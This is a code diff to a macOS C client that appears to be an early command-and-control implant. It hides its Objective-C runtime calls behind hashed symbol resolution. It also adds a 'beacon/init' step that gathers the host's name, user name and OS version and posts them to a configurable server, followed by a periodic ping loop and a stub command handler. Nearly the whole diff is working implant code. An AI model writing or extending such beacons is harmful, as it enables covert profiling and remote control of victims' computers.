@@ -5,6 +5,7 @@
 #include <runtime/kit.h>
 #include <runtime/foundation.h>
 #include <runtime/messaging.h>
+#include "sysinfo.h"
 #include <CoreFoundation/CoreFoundation.h>
 #include <CFNetwork/CFNetwork.h>
 #include <stdio.h>
@@ -29,6 +30,7 @@ static inline void debug_log(const char* fmt, ...) {
 #define DEBUG_LOG(...) ((void)0)
 #endif
 
+
 typedef struct {
     char server_host[256];
     int server_port;
@@ -36,24 +38,37 @@ typedef struct {
     char client_id[64]; // unique identifier for this client
 } client_config_t;
 
+typedef struct {
+    INSTANCE darwin;
+    RTKContext* rtk;
+    client_config_t config;
+} ClientContext;
+
+
+typedef struct {
+    const char* url_path;
+    const char* body;
+    size_t body_length;
+} http_request_t;
+
 // Global state
 static bool should_run = true;
-static client_config_t config;
 
 // Forward declarations
-static bool load_config(const char* config_path);
-static bool send_ping(RTKContext* ctx);
+static bool load_config(const char* config_path, client_config_t* config);
+static bool send_ping(ClientContext* ctx);
+static bool send_http_request(ClientContext* ctx, const http_request_t* req);
 static void handle_command(const char* command);
 
 // Load configuration from file
-static bool load_config(const char* config_path) {
+static bool load_config(const char* config_path, client_config_t* config) {
     FILE* fp = fopen(config_path, "r");
     if (!fp) {
         // If config doesn't exist, use defaults
-        strncpy(config.server_host, "127.0.0.1", sizeof(config.server_host) - 1);
-        config.server_port = 4444;
-        config.ping_interval = 3;
-        snprintf(config.client_id, sizeof(config.client_id), "client_%d", getpid());
+        strncpy(config->server_host, "127.0.0.1", sizeof(config->server_host) - 1);
+        config->server_port = 4444;
+        config->ping_interval = 3;
+        snprintf(config->client_id, sizeof(config->client_id), "client_%d", getpid());
         return false;
     }
 
@@ -62,19 +77,142 @@ static bool load_config(const char* config_path) {
         char key[64], value[256];
         if (sscanf(line, "%63[^=]=%255s", key, value) == 2) {
             if (strcmp(key, "server_host") == 0) {
-                strncpy(config.server_host, value, sizeof(config.server_host) - 1);
+                strncpy(config->server_host, value, sizeof(config->server_host) - 1);
             } else if (strcmp(key, "server_port") == 0) {
-                config.server_port = atoi(value);
+                config->server_port = atoi(value);
             } else if (strcmp(key, "ping_interval") == 0) {
-                config.ping_interval = atoi(value);
+                config->ping_interval = atoi(value);
             } else if (strcmp(key, "client_id") == 0) {
-                strncpy(config.client_id, value, sizeof(config.client_id) - 1);
+                strncpy(config->client_id, value, sizeof(config->client_id) - 1);
             }
         }
     }
     fclose(fp);
     return true;
 }
+
+static bool send_http_request(ClientContext* ctx, const http_request_t* req) {
+    DEBUG_LOG("Starting HTTP request to %s", req->url_path);
+
+    // Create full URL string
+    char url_str[512];
+    snprintf(url_str, sizeof(url_str), "http://%s:%d%s",
+        ctx->config.server_host, ctx->config.server_port, req->url_path);
+
+    DEBUG_LOG("URL string: %s", url_str);  // Add this debug line
+
+    RTKInstance urlString = rtk_string_create(ctx->rtk, url_str);
+    if (!urlString) {
+        DEBUG_LOG("Failed to create URL string");
+        return false;
+    }
+
+    RTKInstance url = rtk_msg_send_obj(ctx->rtk,
+        rtk_get_class(ctx->rtk, "NSURL"),
+        "URLWithString:",
+        urlString);
+    if (!url) {
+        DEBUG_LOG("Failed to create NSURL");
+        rtk_release(ctx->rtk, urlString);
+        return false;
+    }
+
+    // Fixed: Changed ctx to ctx->rtk
+    RTKInstance request = rtk_msg_send_obj(ctx->rtk,
+        rtk_get_class(ctx->rtk, "NSMutableURLRequest"),
+        "requestWithURL:",
+        url);
+    if (!request) {
+        DEBUG_LOG("Failed to create request");
+        rtk_release(ctx->rtk, urlString);
+        rtk_release(ctx->rtk, url);
+        return false;
+    }
+
+    // Set HTTP method to POST
+    RTKInstance postMethod = rtk_string_create(ctx->rtk, "POST");
+    rtk_msg_send_obj(ctx->rtk, request, "setHTTPMethod:", postMethod);
+
+    // Set request body
+    RTKInstance bodyData = rtk_data_create(ctx->rtk, (const uint8_t*)req->body, req->body_length);
+    if (!bodyData) {
+        DEBUG_LOG("Failed to create body data");
+        return false;
+    }
+    rtk_msg_send_obj(ctx->rtk, request, "setHTTPBody:", bodyData);
+
+    // Set content type
+    RTKInstance contentTypeKey = rtk_string_create(ctx->rtk, "Content-Type");
+    RTKInstance contentTypeValue = rtk_string_create(ctx->rtk, "text/plain");
+    rtk_msg_send_2obj(ctx->rtk, request, "setValue:forHTTPHeaderField:",
+        contentTypeValue, contentTypeKey);
+
+    // Get shared session
+    RTKInstance session = rtk_msg_send_class(ctx->rtk,
+        rtk_get_class(ctx->rtk, "NSURLSession"),
+        "sharedSession");
+    if (!session) {
+        DEBUG_LOG("Failed to get shared session");
+        return false;
+    }
+
+    // Create and start data task
+    RTKInstance dataTask = rtk_msg_send_obj(ctx->rtk, session,
+        "dataTaskWithRequest:",
+        request);
+    if (!dataTask) {
+        DEBUG_LOG("Failed to create data task");
+        return false;
+    }
+
+    rtk_msg_send_empty(ctx->rtk, dataTask, "resume");
+
+    // Wait for completion
+    usleep(1000000);  // Wait 1 second for response
+
+    // Cleanup
+    rtk_release(ctx->rtk, urlString);
+    rtk_release(ctx->rtk, url);
+    rtk_release(ctx->rtk, postMethod);
+    rtk_release(ctx->rtk, bodyData);
+    rtk_release(ctx->rtk, contentTypeKey);
+    rtk_release(ctx->rtk, contentTypeValue);
+    rtk_release(ctx->rtk, request);
+    rtk_release(ctx->rtk, dataTask);
+    rtk_release(ctx->rtk, session);
+
+    return true;
+}
+
+static bool send_init(ClientContext* ctx) {
+    SystemInfo info;
+    if (!GetAllSystemInfo(&ctx->darwin, &info)) {
+        DEBUG_LOG("Failed to get system information");
+        return false;
+    }
+
+    DEBUG_LOG("System info retrieved successfully:");
+    DEBUG_LOG("  Hostname: %s", info.hostname);
+    DEBUG_LOG("  Username: %s", info.username);
+    DEBUG_LOG("  OS Version: %s", info.os_version);
+
+    char init_msg[1024];
+    snprintf(init_msg, sizeof(init_msg),
+        "INIT %s\nHOSTNAME: %s\nUSER: %s\nOS: %s\n",
+        ctx->config.client_id,
+        info.hostname,
+        info.username,
+        info.os_version);
+
+    http_request_t req = {
+        .url_path = "/beacon/init",
+        .body = init_msg,
+        .body_length = strlen(init_msg)
+    };
+
+    return send_http_request(ctx, &req);
+}
+
 
 static void handle_command(const char* command) {
     if (!command) return;
@@ -85,113 +223,18 @@ static void handle_command(const char* command) {
     printf("Received command: %s\n", command);
 }
 
-static bool send_ping(RTKContext* ctx) {
-    DEBUG_LOG("Starting HTTP request");
-
-    // Create NSURL
-    DEBUG_LOG("Creating URL string for http://%s:%d", config.server_host, config.server_port);
-    char url_str[512];
-    snprintf(url_str, sizeof(url_str), "http://%s:%d", config.server_host, config.server_port);
-    RTKInstance urlString = rtk_string_create(ctx, url_str);
-    if (!urlString) {
-        DEBUG_LOG("Failed to create URL string");
-        return false;
-    }
-    DEBUG_LOG("Created URL string: %s", url_str);
-
-    RTKInstance url = rtk_msg_send_obj(ctx,
-        rtk_get_class(ctx, "NSURL"),
-        "URLWithString:",
-        urlString);
-    if (!url) {
-        DEBUG_LOG("Failed to create NSURL");
-        rtk_release(ctx, urlString);
-        return false;
-    }
-    DEBUG_LOG("Created NSURL successfully");
-
-    // Create NSMutableURLRequest
-    DEBUG_LOG("Creating NSMutableURLRequest");
-    RTKInstance request = rtk_msg_send_obj(ctx,
-        rtk_get_class(ctx, "NSMutableURLRequest"),
-        "requestWithURL:",
-        url);
-    if (!request) {
-        DEBUG_LOG("Failed to create request");
-        rtk_release(ctx, urlString);
-        rtk_release(ctx, url);
-        return false;
-    }
-
-    // Set HTTP method to POST
-    DEBUG_LOG("Setting HTTP method to POST");
-    RTKInstance postMethod = rtk_string_create(ctx, "POST");
-    rtk_msg_send_obj(ctx, request, "setHTTPMethod:", postMethod);
-
-    // Create request body
+static bool send_ping(ClientContext* ctx) {
     char ping_msg[512];
-    snprintf(ping_msg, sizeof(ping_msg), "PING %s\n", config.client_id);
-    DEBUG_LOG("Creating request body: %s", ping_msg);
-    RTKInstance bodyData = rtk_data_create(ctx, (const uint8_t*)ping_msg, strlen(ping_msg));
-    if (!bodyData) {
-        DEBUG_LOG("Failed to create body data");
-        return false;
-    }
-    rtk_msg_send_obj(ctx, request, "setHTTPBody:", bodyData);
+    snprintf(ping_msg, sizeof(ping_msg), "PING %s\n", ctx->config.client_id);
 
-    // Set content type header
-    DEBUG_LOG("Setting Content-Type header");
-    RTKInstance contentTypeKey = rtk_string_create(ctx, "Content-Type");
-    RTKInstance contentTypeValue = rtk_string_create(ctx, "text/plain");
-    rtk_msg_send_2obj(ctx, request, "setValue:forHTTPHeaderField:",
-        contentTypeValue, contentTypeKey);
+    http_request_t req = {
+        .url_path = "/",
+        .body = ping_msg,
+        .body_length = strlen(ping_msg)
+    };
 
-    // Get shared session
-    DEBUG_LOG("Getting shared NSURLSession");
-    RTKInstance session = rtk_msg_send_class(ctx,
-        rtk_get_class(ctx, "NSURLSession"),
-        "sharedSession");
-    if (!session) {
-        DEBUG_LOG("Failed to get shared session");
-        return false;
-    }
-
-    // Create data task
-    DEBUG_LOG("Creating data task");
-    RTKInstance dataTask = rtk_msg_send_obj(ctx, session,
-        "dataTaskWithRequest:",
-        request);
-    if (!dataTask) {
-        DEBUG_LOG("Failed to create data task");
-        return false;
-    }
-
-    // Resume the task
-    DEBUG_LOG("Resuming data task");
-    rtk_msg_send_empty(ctx, dataTask, "resume");
-
-    // Wait for completion
-    DEBUG_LOG("Waiting for response...");
-    usleep(1000000);  // Wait 1 second for response
-    DEBUG_LOG("Wait complete");
-
-    // Cleanup
-    DEBUG_LOG("Cleaning up resources");
-    rtk_release(ctx, urlString);
-    rtk_release(ctx, url);
-    rtk_release(ctx, postMethod);
-    rtk_release(ctx, bodyData);
-    rtk_release(ctx, contentTypeKey);
-    rtk_release(ctx, contentTypeValue);
-    rtk_release(ctx, request);
-    rtk_release(ctx, dataTask);
-    rtk_release(ctx, session);
-
-    DEBUG_LOG("Request cycle complete");
-    return true;
+    return send_http_request(ctx, &req);
 }
-
-
 
 bool InitializeDarwinApi(INSTANCE* instance) {
     DEBUG_LOG("Starting API initialization");
@@ -206,94 +249,86 @@ bool InitializeDarwinApi(INSTANCE* instance) {
 
     // Initialize Objective-C runtime functions
     instance->Darwin.objc_msgSend = (objc_msgSend_t)GetSymbolAddressH(objc, getObjcMsgSendHash());
-    if (!instance->Darwin.objc_msgSend) {
-        DEBUG_LOG("Failed to resolve objc_msgSend");
-        return false;
-    }
-
     instance->Darwin.objc_getClass = (objc_getClass_t)GetSymbolAddressH(objc, getObjcGetClassHash());
-    if (!instance->Darwin.objc_getClass) {
-        DEBUG_LOG("Failed to resolve objc_getClass");
-        return false;
-    }
-
     instance->Darwin.sel_registerName = (sel_registerName_t)GetSymbolAddressH(objc, getSelRegisterNameHash());
-    if (!instance->Darwin.sel_registerName) {
-        DEBUG_LOG("Failed to resolve sel_registerName");
+
+    if (!instance->Darwin.objc_msgSend || !instance->Darwin.objc_getClass || !instance->Darwin.sel_registerName) {
+        DEBUG_LOG("Failed to resolve basic Objective-C functions");
         return false;
     }
 
-    DEBUG_LOG("Successfully initialized all Objective-C runtime functions");
+    // Initialize system info classes and selectors
+    instance->Darwin.processInfoClass = instance->Darwin.objc_getClass("NSProcessInfo");
+    instance->Darwin.processInfoSel = instance->Darwin.sel_registerName("processInfo");
+    instance->Darwin.hostNameSel = instance->Darwin.sel_registerName("hostName");
+    instance->Darwin.userNameSel = instance->Darwin.sel_registerName("userName");
+    instance->Darwin.osVersionSel = instance->Darwin.sel_registerName("operatingSystemVersionString");
 
-    // TODO: Initialize other Darwin APIs as needed
-    // For now we'll just focus on the Objective-C runtime functions
+    // Cache process info instance
+    instance->Darwin.processInfo = instance->Darwin.objc_msgSend(
+        instance->Darwin.processInfoClass,
+        instance->Darwin.processInfoSel
+    );
 
+    if (!instance->Darwin.processInfo) {
+        DEBUG_LOG("Failed to get processInfo instance");
+        return false;
+    }
+
+    DEBUG_LOG("Successfully initialized all Darwin APIs");
     return true;
 }
 
-int main(int argc, char* argv[]) {
-    printf("0x%X\n", HASHA("LIBOBJC.A.DYLIB"));
 
+int main(int argc, char* argv[]) {
     DEBUG_LOG("Starting client application");
 
-    // Print hashes for debugging
-    printHashes();
+    ClientContext ctx = {0};
 
-    INSTANCE instance = {0};
-    if (!InitializeDarwinApi(&instance)) {
+    if (!InitializeDarwinApi(&ctx.darwin)) {
         printf("Failed to initialize Darwin API\n");
         return 1;
     }
 
-    // Get NSProcessInfo class and selectors
-    Class processInfoClass = objc_getClass("NSProcessInfo");
-    SEL processInfoSel = sel_registerName("processInfo");
-    SEL hostNameSel = sel_registerName("hostName");
-
-    // Call [NSProcessInfo processInfo] using our resolved msgSend
-    id processInfo = instance.Darwin.objc_msgSend((id)processInfoClass, processInfoSel);
-
-    // Call [processInfo hostName]
-    id hostname = instance.Darwin.objc_msgSend(processInfo, hostNameSel);
-
-    printf("Hostname: %s\n", (char*)hostname);
+    ctx.rtk = rtk_context_create();
+    if (!ctx.rtk) {
+        DEBUG_LOG("Failed to create runtime context");
+        fprintf(stderr, "Failed to create runtime context\n");
+        return 1;
+    }
 
     const char* config_path = (argc > 1) ? argv[1] : "client.conf";
     DEBUG_LOG("Using config path: %s", config_path);
 
-    if (load_config(config_path)) {
+    if (!load_config(config_path, &ctx.config)) {
         DEBUG_LOG("Configuration loaded from file");
     } else {
         DEBUG_LOG("Using default configuration");
     }
 
-    RTKContext* ctx = rtk_context_create();
-    if (!ctx) {
-        DEBUG_LOG("Failed to create runtime context");
-        fprintf(stderr, "Failed to create runtime context\n");
+    printf("Client started (ID: %s)\n", ctx.config.client_id);
+    printf("Connecting to %s:%d\n", ctx.config.server_host, ctx.config.server_port);
+    DEBUG_LOG("Client initialized with ID: %s", ctx.config.client_id);
+    DEBUG_LOG("Server target: %s:%d", ctx.config.server_host, ctx.config.server_port);
+
+    // Try to initialize
+    if (!send_init(&ctx)) {
+        DEBUG_LOG("Initialization failed");
+        fprintf(stderr, "Failed to initialize with server\n");
         return 1;
     }
-    DEBUG_LOG("Runtime context created successfully");
 
-    printf("Client started (ID: %s)\n", config.client_id);
-    printf("Connecting to %s:%d\n", config.server_host, config.server_port);
-    DEBUG_LOG("Client initialized with ID: %s", config.client_id);
-    DEBUG_LOG("Server target: %s:%d", config.server_host, config.server_port);
-
+    // Start ping loop
     while (should_run) {
-        DEBUG_LOG("Starting ping cycle");
-        if (!send_ping(ctx)) {
+        if (!send_ping(&ctx)) {
             DEBUG_LOG("Ping failed");
-            printf("Failed to connect to server, retrying in %d seconds\n", config.ping_interval);
-        } else {
-            DEBUG_LOG("Ping successful");
+            printf("Failed to connect to server, retrying in %d seconds\n", ctx.config.ping_interval);
         }
-        DEBUG_LOG("Waiting %d seconds before next ping", config.ping_interval);
-        sleep(config.ping_interval);
+        sleep(ctx.config.ping_interval);
     }
 
     DEBUG_LOG("Shutting down client");
-    rtk_context_destroy(ctx);
+    rtk_context_destroy(ctx.rtk);
     DEBUG_LOG("Cleanup complete");
     return 0;
 }
